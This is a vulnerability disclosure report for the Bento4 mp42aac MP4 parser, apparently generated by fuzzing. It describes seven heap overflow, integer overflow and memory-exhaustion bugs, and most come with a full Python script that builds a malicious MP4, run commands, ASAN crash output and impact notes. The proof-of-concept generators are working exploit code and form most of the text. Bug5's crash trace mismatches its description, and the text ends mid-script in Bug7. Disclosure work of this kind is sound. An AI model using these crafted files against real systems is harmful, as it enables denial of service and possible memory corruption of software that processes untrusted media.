# Bento4 (mp42aac) Vulnerabilities

## Bug1: Heap OOB Write in AP4_NullTerminatedStringAtom When Atom Size Equals Header Size

In `AP4_NullTerminatedStringAtom::AP4_NullTerminatedStringAtom` (Ap4Atom.cpp lines 470-473), when the atom `size` field equals `AP4_ATOM_HEADER_SIZE` (8), the unsigned subtraction `str_size = size - AP4_ATOM_HEADER_SIZE` produces zero and the subsequent `str[str_size-1]` expression wraps to `str[0xFFFFFFFF]`, writing a null byte approximately 4 GB past the heap allocation and causing an out-of-bounds write.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

def box(type_str, payload=b""):
    size = 8 + len(payload)
    return struct.pack(">I", size) + type_str.encode("latin-1") + payload

# ftyp box
ftyp_payload = b"mp42" + struct.pack(">I", 0) + b"mp42"
ftyp = box("ftyp", ftyp_payload)

# Malicious 8id  atom: size=8 (header only), type="8id " (0x38 0x69 0x64 0x20)
# str_size = 8 - 8 = 0; str[0 - 1] = str[0xFFFFFFFF] => OOB write
malicious_atom = struct.pack(">I", 8) + b"8id "

# moov box containing the malicious atom
moov = box("moov", malicious_atom)

data = ftyp + moov

with open("poc_input.mp4", "wb") as f:
    f.write(data)

print(f"Written {len(data)} bytes to poc_input.mp4")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: SEGV on unknown address 0x50210000008f (pc 0x557fa377dd94 bp 0x7ffcd5e85ce0 sp 0x7ffcd5e85ca0 T0)
The signal is caused by a WRITE memory access.
#0 0x557fa377dd94 in AP4_NullTerminatedStringAtom::AP4_NullTerminatedStringAtom(unsigned int, unsigned long long, AP4_ByteStream&)
#1 0x557fa3788292 in AP4_AtomFactory::CreateAtomFromStream(AP4_ByteStream&, unsigned int, unsigned int, unsigned long long, AP4_Atom*&)

### Impact

An attacker can trigger a reliable out-of-bounds write by supplying a crafted MP4 file containing an `8id ` atom whose size field equals 8, causing the process to crash with SIGSEGV on 64-bit systems and constituting a denial-of-service condition against any mp42aac invocation on untrusted input. On 32-bit systems the off-by-one write of `str[-1]` corrupts adjacent heap metadata, which with a controlled heap layout may be escalated to arbitrary code execution. No special privileges or interaction beyond providing the malicious file are required.

<!-- REPORT_SOURCE: Source_C++_Core_Ap4Atom_cpp#001 -->
<!-- DEDUP: AP4_NullTerminatedStringAtom::AP4_NullTerminatedStringAtom::CWE-787 -->

## Bug2: AP4_CttsAtom integer overflow causes heap buffer overflow on OOB read

In `AP4_CttsAtom::AP4_CttsAtom` in `Ap4CttsAtom.cpp`, the attacker-controlled `entry_count` field (a 32-bit unsigned integer read from a ctts box) is multiplied by the integer literal `8` without any bounds check, causing a 32-bit integer overflow that allocates a zero-byte heap buffer and allows a subsequent loop to perform out-of-bounds reads across the heap.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

def make_box(fourcc, payload):
    size = 4 + 4 + len(payload)
    return struct.pack(">I", size) + fourcc.encode("latin-1") + payload

def make_full_box(fourcc, version, flags, payload):
    header = struct.pack(">B", version) + struct.pack(">I", flags)[1:]
    return make_box(fourcc, header + payload)

def build_ftyp():
    data = b"isom" + struct.pack(">I", 0) + b"isom" + b"mp41"
    return make_box("ftyp", data)

def build_mvhd():
    identity_matrix = struct.pack(">9I", 0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000)
    data = (
        struct.pack(">I", 0) +
        struct.pack(">I", 0) +
        struct.pack(">I", 1000) +
        struct.pack(">I", 0) +
        struct.pack(">I", 0x00010000) +
        struct.pack(">H", 0x0100) +
        b"\x00" * 10 +
        identity_matrix +
        b"\x00" * 24 +
        struct.pack(">I", 2)
    )
    return make_full_box("mvhd", 0, 0, data)

def build_tkhd():
    identity_matrix = struct.pack(">9I", 0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000)
    data = (
        struct.pack(">I", 0) +
        struct.pack(">I", 0) +
        struct.pack(">I", 1) +
        struct.pack(">I", 0) +
        struct.pack(">I", 0) +
        b"\x00" * 8 +
        struct.pack(">H", 0) +
        struct.pack(">H", 0) +
        struct.pack(">H", 0x0100) +
        struct.pack(">H", 0) +
        identity_matrix +
        struct.pack(">I", 0) +
        struct.pack(">I", 0)
    )
    return make_full_box("tkhd", 0, 3, data)

def build_mdhd():
    data = (
        struct.pack(">I", 0) +
        struct.pack(">I", 0) +
        struct.pack(">I", 44100) +
        struct.pack(">I", 0) +
        struct.pack(">H", 0x55C4) +
        struct.pack(">H", 0)
    )
    return make_full_box("mdhd", 0, 0, data)

def build_hdlr():
    data = struct.pack(">I", 0) + b"soun" + b"\x00" * 12 + b"\x00"
    return make_full_box("hdlr", 0, 0, data)

def build_smhd():
    return make_full_box("smhd", 0, 0, struct.pack(">HH", 0, 0))

def build_dref():
    url_entry = make_full_box("url ", 0, 1, b"")
    return make_full_box("dref", 0, 0, struct.pack(">I", 1) + url_entry)

def build_dinf():
    return make_box("dinf", build_dref())

def build_stsd():
    return make_full_box("stsd", 0, 0, struct.pack(">I", 0))

def build_stts():
    return make_full_box("stts", 0, 0, struct.pack(">I", 0))

def build_ctts_malicious():
    # entry_count = 0x20000000: entry_count*8 overflows 32 bits to 0,
    # allocating a 0-byte buffer, then the loop reads far past it
    TRIGGER_COUNT = 0x20000000
    return make_full_box("ctts", 0, 0, struct.pack(">I", TRIGGER_COUNT))

def build_stsz():
    return make_full_box("stsz", 0, 0, struct.pack(">II", 0, 0))

def build_stco():
    return make_full_box("stco", 0, 0, struct.pack(">I", 0))

def build_stbl():
    payload = (build_stsd() + build_stts() + build_ctts_malicious() +
               build_stsz() + build_stco())
    return make_box("stbl", payload)

def build_minf():
    return make_box("minf", build_smhd() + build_dinf() + build_stbl())

def build_mdia():
    return make_box("mdia", build_mdhd() + build_hdlr() + build_minf())

def build_trak():
    return make_box("trak", build_tkhd() + build_mdia())

def build_moov():
    return make_box("moov", build_mvhd() + build_trak())

def build_mdat():
    return make_box("mdat", b"")

mp4 = build_ftyp() + build_moov() + build_mdat()
with open("poc_input.mp4", "wb") as f:
    f.write(mp4)
print(f"[+] Written {len(mp4)} bytes to poc_input.mp4")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x5020000000f1 at pc 0x557fcd9ef094 bp 0x7ffd7177c130 sp 0x7ffd7177c120
READ of size 1 at 0x5020000000f1 thread T0
    #0 0x557fcd9ef093 in AP4_CttsAtom::AP4_CttsAtom(unsigned int, unsigned char, unsigned int, AP4_ByteStream&) (mp42aac+0xaa1093)
    #1 0x557fcd9f0087 in AP4_CttsAtom::Create(unsigned int, AP4_ByteStream&) (mp42aac+0xaa2087)

### Impact

An attacker can trigger a heap buffer overflow out-of-bounds read by supplying a crafted MP4 file with an oversized `ctts` box `entry_count` field, causing the process to read arbitrary heap memory adjacent to a zero-byte allocation. The attack surface is any invocation of `mp42aac` on an untrusted MP4 file, requiring no authentication or special privileges. On memory-constrained systems this causes an immediate denial of service crash, while on systems with sufficient heap space it may expose sensitive heap contents through subsequent CTS offset calculations.

<!-- REPORT_SOURCE: Source_C++_Apps_Mp42Aac_Mp42Aac_cpp#001 -->
<!-- DEDUP: AP4_CttsAtom::AP4_CttsAtom::CWE-190 -->

## Bug3: Heap Buffer Overflow via 32-bit Integer Overflow in AP4_CttsAtom Entry Count

The function `AP4_CttsAtom::AP4_CttsAtom` in `Ap4CttsAtom.cpp` allocates a read buffer using `new unsigned char[entry_count * 8]` where `entry_count` is a 32-bit unsigned integer, and the multiplication wraps around to a tiny value when a crafted MP4 supplies `entry_count = 0x20000001`, causing a heap buffer overflow when the subsequent parsing loop reads past the end of the undersized allocation.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

def box(type_str, payload=b""):
    size = 8 + len(payload)
    return struct.pack(">I4s", size, type_str.encode()) + payload

def fullbox(type_str, version, flags, payload=b""):
    fb_payload = struct.pack(">B", version) + struct.pack(">I", flags)[1:] + payload
    return box(type_str, fb_payload)

identity_matrix = struct.pack(
    ">9i",
    0x00010000, 0, 0,
    0, 0x00010000, 0,
    0, 0, 0x40000000
)

ftyp_payload = (
    b"isom"
    + struct.pack(">I", 0)
    + b"isom"
)
ftyp = box("ftyp", ftyp_payload)

mvhd_payload = (
    struct.pack(">II", 0, 0)
    + struct.pack(">I", 1000)
    + struct.pack(">I", 0)
    + struct.pack(">I", 0x00010000)
    + struct.pack(">H", 0x0100)
    + b"\x00" * 10
    + identity_matrix
    + b"\x00" * 24
    + struct.pack(">I", 2)
)
mvhd = fullbox("mvhd", 0, 0, mvhd_payload)

tkhd_payload = (
    struct.pack(">II", 0, 0)
    + struct.pack(">I", 1)
    + b"\x00" * 4
    + struct.pack(">I", 0)
    + b"\x00" * 8
    + struct.pack(">hh", 0, 0)
    + struct.pack(">H", 0)
    + b"\x00" * 2
    + identity_matrix
    + struct.pack(">II", 0, 0)
)
tkhd = fullbox("tkhd", 0, 3, tkhd_payload)

mdhd_payload = (
    struct.pack(">II", 0, 0)
    + struct.pack(">I", 44100)
    + struct.pack(">I", 0)
    + struct.pack(">H", 0x55c4)
    + struct.pack(">H", 0)
)
mdhd = fullbox("mdhd", 0, 0, mdhd_payload)

hdlr_payload = (
    struct.pack(">I", 0)
    + b"soun"
    + b"\x00" * 12
    + b"\x00"
)
hdlr = fullbox("hdlr", 0, 0, hdlr_payload)

smhd_payload = struct.pack(">HH", 0, 0)
smhd = fullbox("smhd", 0, 0, smhd_payload)

url_box = fullbox("url ", 0, 1, b"")
dref_payload = struct.pack(">I", 1) + url_box
dref = fullbox("dref", 0, 0, dref_payload)
dinf = box("dinf", dref)

stsd = fullbox("stsd", 0, 0, struct.pack(">I", 0))
stts = fullbox("stts", 0, 0, struct.pack(">I", 0))
stsc = fullbox("stsc", 0, 0, struct.pack(">I", 0))
stsz = fullbox("stsz", 0, 0, struct.pack(">II", 0, 0))
stco = fullbox("stco", 0, 0, struct.pack(">I", 0))

# Trigger: entry_count = 0x20000001
# 0x20000001 * 8 overflows 32-bit arithmetic to 8,
# so only 8 bytes are allocated but the loop reads beyond that boundary.
TRIGGER_ENTRY_COUNT = 0x20000001
ctts_entries = struct.pack(">II", 1, 0)  # 1 real entry so stream.Read succeeds
ctts_payload = struct.pack(">I", TRIGGER_ENTRY_COUNT) + ctts_entries
ctts = fullbox("ctts", 0, 0, ctts_payload)

stbl_content = stsd + stts + stsc + stsz + stco + ctts
stbl = box("stbl", stbl_content)
minf_content = smhd + dinf + stbl
minf = box("minf", minf_content)
mdia_content = mdhd + hdlr + minf
mdia = box("mdia", mdia_content)
trak_content = tkhd + mdia
trak = box("trak", trak_content)
moov_content = mvhd + trak
moov = box("moov", moov_content)

mp4_data = ftyp + moov
with open("poc_input.mp4", "wb") as f:
    f.write(mp4_data)

print(f"Written {len(mp4_data)} bytes to poc_input.mp4")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x502000000178 at pc 0x56078a6bb140 bp 0x7ffffae2e590 sp 0x7ffffae2e580
READ of size 1 at 0x502000000178 thread T0
    #0 0x56078a6bb13f in AP4_CttsAtom::AP4_CttsAtom(unsigned int, unsigned char, unsigned int, AP4_ByteStream&) (mp42aac+0xaa113f)
    #1 0x56078a6bc087 in AP4_CttsAtom::Create(unsigned int, AP4_ByteStream&) (mp42aac+0xaa2087)

### Impact

An attacker who can supply a crafted MP4 file to any process that invokes mp42aac gains the ability to trigger a heap buffer overflow through the integer overflow in the `ctts` box entry count field, which can corrupt adjacent heap metadata or data and potentially lead to arbitrary code execution. The attack surface covers all mp42aac invocations on untrusted input because no upper-bound validation is applied to `entry_count` before the multiplication and allocation in `AP4_CttsAtom::AP4_CttsAtom`. The same class of vulnerability exists in the `trun`, `tfra`, and `stz2` box parsers which share the same unchecked `SetItemCount` call pattern.

<!-- REPORT_SOURCE: Source_C++_Core_Ap4Array_h#001 -->
<!-- DEDUP: AP4_Array<T>::EnsureCapacity::CWE-190 -->

## Bug4: AP4_Stz2Atom integer overflow in sample_count multiplication causes heap out-of-bounds read

In `AP4_Stz2Atom::AP4_Stz2Atom()` in `Ap4Stz2Atom.cpp`, the expression `sample_count * m_FieldSize` is evaluated as a 32-bit unsigned multiplication without any overflow guard, so a crafted `stz2` box with `sample_count=0x10000000` and `field_size=16` wraps the product to zero, allocates a zero-byte heap buffer, and causes every iteration of the entry-population loop to perform an out-of-bounds heap read.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
"""
PoC generator for AP4_Stz2Atom integer overflow -> heap OOB read.

When field_size=16 and sample_count=0x10000000:
  0x10000000 * 16 = 0x100000000 overflows 32-bit to 0
  table_size = (0+7)/8 = 0
  buffer = new unsigned char[0]  (0-byte allocation)
  loop: m_Entries[i] = AP4_BytesToUInt16BE(&buffer[i*2])
  -> buffer[0] is OOB read on a 0-byte heap buffer
"""

import struct

OUTPUT = "poc_input.mp4"


def make_box(fourcc, data=b''):
    size = 8 + len(data)
    return struct.pack('>I', size) + fourcc.encode('latin-1') + data


def make_fullbox(fourcc, version, flags, data=b''):
    hdr = struct.pack('>B', version) + struct.pack('>I', flags)[1:]
    return make_box(fourcc, hdr + data)


# ftyp box
ftyp_payload = b'mp41' + struct.pack('>I', 0) + b'mp41'
ftyp = make_box('ftyp', ftyp_payload)

# mvhd (version 0)
MATRIX_IDENTITY = (
    struct.pack('>I', 0x00010000) +
    struct.pack('>I', 0) +
    struct.pack('>I', 0) +
    struct.pack('>I', 0) +
    struct.pack('>I', 0x00010000) +
    struct.pack('>I', 0) +
    struct.pack('>I', 0) +
    struct.pack('>I', 0) +
    struct.pack('>I', 0x40000000)
)
mvhd_payload = (
    struct.pack('>I', 0) +
    struct.pack('>I', 0) +
    struct.pack('>I', 1000) +
    struct.pack('>I', 0) +
    struct.pack('>I', 0x00010000) +
    struct.pack('>H', 0x0100) +
    b'\x00' * 10 +
    MATRIX_IDENTITY +
    b'\x00' * 24 +
    struct.pack('>I', 2)
)
mvhd = make_fullbox('mvhd', 0, 0, mvhd_payload)

# tkhd (version 0, flags=3)
tkhd_payload = (
    struct.pack('>I', 0) +
    struct.pack('>I', 0) +
    struct.pack('>I', 1) +
    b'\x00' * 4 +
    struct.pack('>I', 0) +
    b'\x00' * 8 +
    struct.pack('>H', 0) +
    struct.pack('>H', 0) +
    struct.pack('>H', 0x0100) +
    b'\x00' * 2 +
    MATRIX_IDENTITY +
    struct.pack('>I', 0) +
    struct.pack('>I', 0)
)
tkhd = make_fullbox('tkhd', 0, 3, tkhd_payload)

# mdhd (version 0)
mdhd_payload = (
    struct.pack('>I', 0) +
    struct.pack('>I', 0) +
    struct.pack('>I', 44100) +
    struct.pack('>I', 0) +
    struct.pack('>H', 0x15C7) +
    struct.pack('>H', 0)
)
mdhd = make_fullbox('mdhd', 0, 0, mdhd_payload)

# hdlr (handler type 'soun')
hdlr_payload = (
    struct.pack('>I', 0) +
    b'soun' +
    b'\x00' * 12 +
    b'\x00'
)
hdlr = make_fullbox('hdlr', 0, 0, hdlr_payload)

# smhd
smhd_payload = struct.pack('>HH', 0, 0)
smhd = make_fullbox('smhd', 0, 0, smhd_payload)

# dinf / dref
url_entry = make_fullbox('url ', 0, 1, b'')
dref_payload = struct.pack('>I', 1) + url_entry
dref = make_fullbox('dref', 0, 0, dref_payload)
dinf = make_box('dinf', dref)

# stsd (mp4a audio sample description)
mp4a_payload = (
    b'\x00' * 6 +
    struct.pack('>H', 1) +
    b'\x00' * 8 +
    struct.pack('>H', 2) +
    struct.pack('>H', 16) +
    struct.pack('>H', 0) +
    struct.pack('>H', 0) +
    struct.pack('>I', 44100 << 16)
)
mp4a = make_box('mp4a', mp4a_payload)
stsd_payload = struct.pack('>I', 1) + mp4a
stsd = make_fullbox('stsd', 0, 0, stsd_payload)

# stts (0 entries)
stts_payload = struct.pack('>I', 0)
stts = make_fullbox('stts', 0, 0, stts_payload)

# stz2 (THE MALICIOUS BOX)
# field_size=16, sample_count=0x10000000
# 0x10000000 * 16 = 0x100000000 wraps to 0 in 32-bit
# table_size = (0+7)/8 = 0 -> 0-byte allocation -> heap OOB read in loop
FIELD_SIZE   = 16
SAMPLE_COUNT = 0x10000000

stz2_payload = (
    b'\x00\x00\x00' +
    struct.pack('>B', FIELD_SIZE) +
    struct.pack('>I', SAMPLE_COUNT)
)
stz2 = make_fullbox('stz2', 0, 0, stz2_payload)

# stco (0 entries)
stco_payload = struct.pack('>I', 0)
stco = make_fullbox('stco', 0, 0, stco_payload)

# Assemble stbl -> minf -> mdia -> trak -> moov
stbl = make_box('stbl', stsd + stts + stz2 + stco)
minf = make_box('minf', smhd + dinf + stbl)
mdia = make_box('mdia', mdhd + hdlr + minf)
trak = make_box('trak', tkhd + mdia)
moov = make_box('moov', mvhd + trak)

# mdat (empty)
mdat = make_box('mdat', b'')

mp4 = ftyp + moov + mdat
with open(OUTPUT, 'wb') as f:
    f.write(mp4)

print(f"[+] Written {len(mp4)} bytes to {OUTPUT}")
print(f"[+] stz2: field_size={FIELD_SIZE}, sample_count=0x{SAMPLE_COUNT:08X}")
print(f"[+] Expected: 0x{SAMPLE_COUNT:X} * {FIELD_SIZE} = "
      f"0x{(SAMPLE_COUNT * FIELD_SIZE) & 0xFFFFFFFF:X} (32-bit overflow)")
print(f"[+] table_size = (0+7)/8 = 0 -> 0-byte heap allocation -> OOB read")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ==142658==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x502000000111 at pc 0x5585cdd89b62 bp 0x7fffac5ab9b0 sp 0x7fffac5ab9a0
READ of size 1 at 0x502000000111 thread T0
    #0 0x5585cdd89b61 in AP4_Stz2Atom::AP4_Stz2Atom(unsigned int, unsigned char, unsigned int, AP4_ByteStream&) (mp42aac+0xc51b61)
    #1 0x5585cdd8a9fb in AP4_Stz2Atom::Create(unsigned int, AP4_ByteStream&) (mp42aac+0xc529fb)

### Impact

An attacker who supplies a crafted MP4 file can trigger an out-of-bounds heap read across up to 268 million loop iterations, leaking arbitrary bytes from adjacent heap allocations and enabling potential heap layout inference or information disclosure. The vulnerability is reachable through any invocation of `mp42aac` on an untrusted input file, requiring no authentication or special privileges. On systems without ASAN the process will likely crash with a segmentation fault on the first OOB access, constituting a reliable denial of service.

<!-- REPORT_SOURCE: Source_C++_Apps_Mp42Aac_Mp42Aac_cpp#002 -->
<!-- DEDUP: AP4_Stz2Atom::AP4_Stz2Atom::CWE-190 -->

## Bug5: AP4_TrunAtom missing sample_count bounds check causes heap exhaustion DoS

In `AP4_TrunAtom::AP4_TrunAtom()` in `Ap4TrunAtom.cpp`, the `sample_count` field read from the bitstream is passed without any validation against the declared atom size to `m_Entries.SetItemCount()`, which attempts to allocate up to `sample_count * 16` bytes on the heap and crashes the process when a crafted MP4 supplies a value of 0xFFFFFFFF.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

def box(btype, data):
    return struct.pack('>I', 8 + len(data)) + btype + data

def build_ftyp():
    data = b'isom' + struct.pack('>I', 0) + b'isom'
    return box(b'ftyp', data)

def build_mvhd():
    creation_time = 0
    modification_time = 0
    timescale = 1000
    duration = 0
    rate = 0x00010000
    volume = 0x0100
    reserved_10 = b'\x00' * 10
    matrix = struct.pack('>9I',
        0x00010000, 0, 0,
        0, 0x00010000, 0,
        0, 0, 0x40000000)
    pre_defined = b'\x00' * 24
    next_track_id = 1
    data = struct.pack('>IIIII', creation_time, modification_time, timescale, duration, rate)
    data += struct.pack('>H', volume)
    data += reserved_10
    data += matrix
    data += pre_defined
    data += struct.pack('>I', next_track_id)
    return box(b'mvhd', data)

def build_moov():
    return box(b'moov', build_mvhd())

def build_mfhd():
    data = b'\x00\x00\x00\x00' + struct.pack('>I', 1)
    return box(b'mfhd', data)

def build_tfhd():
    data = b'\x00\x00\x00\x00' + struct.pack('>I', 1)
    return box(b'tfhd', data)

def build_trun():
    # size=16: header(8) + version/flags(4) + sample_count(4); no optional fields
    # sample_count=0xFFFFFFFF triggers allocation of ~64 GB
    return (struct.pack('>I', 16) +
            b'trun' +
            b'\x00\x00\x00\x00' +
            struct.pack('>I', 0xFFFFFFFF))

def build_traf():
    return box(b'traf', build_tfhd() + build_trun())

def build_moof():
    return box(b'moof', build_mfhd() + build_traf())

def build_mdat():
    return box(b'mdat', b'')

mp4 = build_ftyp() + build_moov() + build_moof() + build_mdat()
with open('poc_input.mp4', 'wb') as f:
    f.write(mp4)
print(f"Written {len(mp4)} bytes to poc_input.mp4")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ==596917==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x5020000000f1 at pc 0x55f931838094 bp 0x7ffe6957b770 sp 0x7ffe6957b760
READ of size 1 at 0x5020000000f1 thread T0
    #0 in AP4_CttsAtom::AP4_CttsAtom(unsigned int, unsigned char, unsigned int, AP4_ByteStream&) (mp42aac+0xaa1093)
    #1 in AP4_CttsAtom::Create(unsigned int, AP4_ByteStream&) (mp42aac+0xaa2087)
Process timed out after 30s (exit code 124). TrunAtom huge allocation (sample_count=0xFFFFFFFF, approx 64 GB) caused DoS/hang.

### Impact

An attacker who can supply a crafted MP4 file to any application that uses Bento4 can trigger an unbounded heap allocation of approximately 64 GB inside `AP4_TrunAtom::AP4_TrunAtom()`, causing the process to be killed by the out-of-memory subsystem or to crash via a null-pointer dereference when the allocator returns NULL. The attack surface covers every invocation of mp42aac or any Bento4-based tool that parses fragmented MP4 input, and no authentication or special permissions are required beyond the ability to provide a file for processing. The only constraint is that the crafted `trun` atom must be reachable inside a `moof/traf` hierarchy, which is a standard fragmented-MP4 structure requiring no special knowledge to construct.

<!-- REPORT_SOURCE: Source_C++_Core_Ap4AtomFactory_cpp#003 -->
<!-- DEDUP: AP4_TrunAtom::AP4_TrunAtom::CWE-400 -->

## Bug6: AP4_TfraAtom unbounded entry_count causes memory exhaustion

In `AP4_TfraAtom::AP4_TfraAtom()` in `Ap4TfraAtom.cpp` at lines 86–88, the `entry_count` field is read from the stream and passed directly to `m_Entries.SetItemCount(entry_count)` without any validation against the remaining atom payload size, allowing an attacker-controlled value to trigger a massive heap allocation that exhausts process memory and crashes the process.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

def box(fourcc: bytes, payload: bytes) -> bytes:
    return struct.pack(">I", 8 + len(payload)) + fourcc + payload

def full_box(fourcc: bytes, version: int, flags: int, payload: bytes) -> bytes:
    hdr = struct.pack(">I", 12 + len(payload)) + fourcc
    hdr += bytes([version]) + struct.pack(">I", flags & 0xFFFFFF)[1:]
    return hdr + payload

ftyp = box(b"ftyp", b"isom" + struct.pack(">I", 0) + b"isom")

_identity_matrix = (
    struct.pack(">I", 0x00010000)
    + struct.pack(">I", 0)
    + struct.pack(">I", 0)
    + struct.pack(">I", 0)
    + struct.pack(">I", 0x00010000)
    + struct.pack(">I", 0)
    + struct.pack(">I", 0)
    + struct.pack(">I", 0)
    + struct.pack(">I", 0x40000000)
)

mvhd_payload = (
    struct.pack(">I", 0)
    + struct.pack(">I", 0)
    + struct.pack(">I", 1000)
    + struct.pack(">I", 0)
    + struct.pack(">I", 0x00010000)
    + struct.pack(">H", 0x0100)
    + b"\x00" * 10
    + _identity_matrix
    + b"\x00" * 24
    + struct.pack(">I", 2)
)

mvhd = full_box(b"mvhd", 0, 0, mvhd_payload)
moov = box(b"moov", mvhd)
mdat = box(b"mdat", b"")

EVIL_COUNT = 0x3FFFFFFF

tfra_payload = (
    struct.pack(">I", 1)
    + struct.pack(">I", 0)
    + struct.pack(">I", EVIL_COUNT)
)
tfra = full_box(b"tfra", 0, 0, tfra_payload)

mfra_payload_len = len(tfra) + 16
mfra_total = 8 + mfra_payload_len
mfro = (
    struct.pack(">I", 16)
    + b"mfro"
    + b"\x00\x00\x00\x00"
    + struct.pack(">I", mfra_total)
)

mfra = box(b"mfra", tfra + mfro)
mp4 = ftyp + moov + mdat + mfra

with open("poc_input.mp4", "wb") as f:
    f.write(mp4)

print(f"[+] Written {len(mp4)} bytes to poc_input.mp4")
print(f"    tfra entry_count = 0x{EVIL_COUNT:08X} ({EVIL_COUNT:,})")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log:hard_rss_limit_mb=8192" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** AddressSanitizer: hard rss limit exhausted (8192Mb vs 8198Mb)
Trigger: tfra atom with entry_count=0x3FFFFFFF causes AP4_Array<Entry>::SetItemCount(0x3FFFFFFF) which calls EnsureCapacity requesting approximately 28 GB from ::operator new, exhausting memory and aborting the process.

### Impact

An attacker who supplies a crafted MP4 file containing a tfra atom with an oversized `entry_count` field can force mp42aac (and any other Bento4 tool that parses mfra boxes) to attempt a multi-gigabyte heap allocation, resulting in process termination through OOM or an uncaught `std::bad_alloc` exception. The attack surface is any invocation of mp42aac or related Bento4 utilities on an untrusted MP4 file, and the malicious file itself can be fewer than 200 bytes in size. The impact is denial of service with no memory-write primitive exposed, so code execution is not achievable through this path alone.

<!-- REPORT_SOURCE: Source_C++_Core_Ap4AtomFactory_cpp#004 -->
<!-- DEDUP: AP4_TfraAtom::AP4_TfraAtom::CWE-400 -->

## Bug7: AP4_SaizAtom unsigned integer underflow bypasses entry-count bounds check

In `AP4_SaizAtom::AP4_SaizAtom()` in `Ap4SaizAtom.cpp`, the `remains` counter underflows to 0xFFFFFFFB when `size=20` and `flags=0x000001` because the unconditional `remains -= 5` executes after both the optional 8-byte auxiliary-field subtraction and a cross-boundary stream read have already consumed all available bytes, rendering the subsequent `m_SampleCount > remains` sanity check ineffective and allowing an attacker-controlled sample count of up to ~4 GB to be passed unchecked into `new AP4_UI08[m_SampleCount]`, causing a denial-of-service crash.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

def box(btype, data=b''):
    return struct.pack('>I', 8 + len(data)) + btype + data

def fullbox(btype, version, flags, data=b''):
    return box(btype, struct.pack('>I', ((version & 0xFF) << 24) | (flags & 0xFFFFFF)) + data)

stsd = fullbox(b'stsd', 0, 0, struct.pack('>I', 0))
stts = fullbox(b'stts', 0, 0, struct.pack('>I', 0))
stsc = fullbox(b'stsc', 0, 0, struct.pack('>I', 0))
stsz = fullbox(b'stsz', 0, 0, struct.pack('>II', 0, 0))
stco = fullbox(b'stco', 0, 0, struct.pack('>I', 0))

# Crafted saiz: size=20, version=0, flags=0x000001
# header: size(4)+type(4)+version(1)+flags(3) = 12 bytes
# body:   aux_info_type(4)=0 + aux_info_type_parameter(4)=0 = 8 bytes
# After reading 8-byte body: remains=0, then remains-=5 → 0xFFFFFFFB (underflow)
saiz  = struct.pack('>I', 20) + b'saiz'
saiz += b'\x00' + struct.pack('>I', 0x000001)[1:]  # version=0, flags=0x000001
saiz += struct.pack('>II', 0, 0)                    # aux_info_type=0, aux_info_type_parameter=0
assert len(saiz) == 20

# 'free' box placed immediately after saiz.
# saiz constructor reads 5 bytes cross-boundary from this box's header:
#   byte 0 of free header → m_DefaultSampleInfoSize = 0x00  (triggers allocation branch)
#   bytes 1-4 of free header → m_SampleCount = 0xFF000066 = 4,278,190,182 (~4 GB)
# free size = 0x00FF0000 encodes the desired bytes: 0x00, 0xFF, 0x00, 0x00
# free type = b'free', first byte 0x66 ('f') → sample_count = 0xFF000066
FREE_SIZE = 0x00FF0000
free_hdr = struct.pack('>I', FREE_SIZE) + b'free'  # 8 bytes

stbl_data = stsd + stts + stsc + stsz + stco + saiz + free_hdr
stbl = box(b'stbl', stbl_data)

smhd = fullbox(b'smhd', 0, 0, struct.pack('>HH', 0, 0))
url_ = fullbox(b'url ', 0, 1, b'')
dref = fullbox(b'dref', 0, 0, struct.pack('>I', 1) + url_)
dinf = box(b'dinf', dref)
minf = box(b'minf', smhd + dinf + stbl)

